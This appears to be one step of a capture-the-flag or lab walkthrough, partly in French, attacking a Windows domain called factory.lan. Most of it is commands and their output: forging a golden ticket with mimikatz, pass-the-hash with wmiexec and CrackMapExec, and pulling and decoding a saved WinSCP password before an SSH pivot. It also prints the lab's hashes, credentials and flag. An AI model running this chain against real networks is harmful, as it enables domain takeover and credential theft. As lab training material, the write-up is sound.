# Step 9

## golden ticket

* get domain sid

```powershell
Get-ADDomain
```

* craft le golden ticket

```powershell
.\mimikatz.exe

privilege::debug

kerberos::golden /user:Administrator /domain:factory.lan /sid:3c68c509b487662c87ced8ebcda6e69b /krbtgt:3c68c509b487662c87ced8ebcda6e69b /ticket:factory.lan.kirbi
```

* load le ticket

```powershell
.\mimikatz.exe

privilege::debug

kerberos::ptt factory.lan.ticket
```

## kirbi to ccache

* dans kekeo 

```powershell
misc::convert ccache factory.lan.kirbi
```

## connection to 172.16.42.101

dans le bloodhound on voit une autre machine: pc01-dev.factory.lan, quand on l'a ping ça redirige bien sur la 101, donc aevec le golden ticket :

```powershell
PsExec.exe \\pc01-dev.factory.lan cmd.exe
```

apres avoir enum un peu les fichiers et les dossier, on voit deux users :

- adminWorkstation
- Marina

adminWorkstation est dans le ntds.dit, donc un utilisateur du domaine. Utilisateur avec lequel il est possible de pop un shell.

* wimexec en pass the hash

```bash
/usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
```

* cme pth

```bash
(CrackMapExec-0pwsdAYT) ➜  CrackMapExec git:(master) cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY'

SMB         172.16.42.101   445    PC01-DEV         [*] Windows 10.0 Build 18362 x64 (name:PC01-DEV) (domain:FACTORY) (signing:False) (SMBv1:False)
SMB         172.16.42.101   445    PC01-DEV         [+] FACTORY\adminWorkstation aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d (Pwn3d!)

```

## info winscp

```bash
root@arcardia:/opt/t/CrackMapExec# /usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>reg.exe query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2"

HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Configuration
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions

C:\>reg.exe query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions"

HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\Default%20Settings
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78

C:\>reg.exe query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78"

HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78
    HostName    REG_SZ    172.16.69.78
    UserName    REG_SZ    veruca
    Password    REG_SZ    A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE

```

* decoded creds 

> https://github.com/anoopengineer/winscppasswd/releases

```powershell
.\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE

CuiiiiYEE3r3!
```

* trouver le binaire de winscp

```powershell
type C:\Users\adminWorkstation\Desktop\WinSCP.lnk

map the result with https://docs.python.org/2.4/lib/standard-encodings.html
and then execute wmiexec.py again with -codec and the corresponding codec
L�F� Ӭ��C)�0ĞD)�q�i�а/{P�O� �:i�+00�/C:\�1�NӭPROGRA~2�	�sN�&�Nӭ.XV��GProgram Files (x86)@shell32.dll,-21817T1�NԭWinSCP>	��Nӭ�Nխ.��'�fWinSCP`2а/�Nc� WinSCP.exeF	��Nӭ�Nԭ.��WinSCP.exe�W-Vρ`�C:\Program Files (x86)\WinSCP\WinSCP.exe(WinSCP: SFTP, FTP, WebDAV and SCP client...\..\..\Program Files (x86)\WinSCP\WinSCP.exeC:\Program Files (x86)\WinSCP�*�
```

> C:\Program Files (x86)\WinSCP\WinSCP.exe

## add route to connect to srv01

```bash
sudo ip route add 172.16.69.0/24 via 10.8.0.25 dev tun0
```

* connection as veruca

```bash
ssh veruca@172.16.69.78
```

## Flag

> 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2
